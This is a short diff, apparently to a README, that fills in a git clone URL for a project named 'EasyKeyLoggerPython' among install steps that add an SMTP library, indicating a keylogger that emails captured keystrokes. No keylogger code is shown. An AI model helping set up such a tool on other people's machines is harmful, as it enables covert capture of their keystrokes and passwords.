@@ -11,7 +11,7 @@ $ pip install logging
 
 $ pip install secure-smtplib
 
-$ git clone 
+$ git clone https://github.com/BrodyKretz/EasyKeyLoggerPython.git
 
 $ cd EasyKeyLoggerPython
 
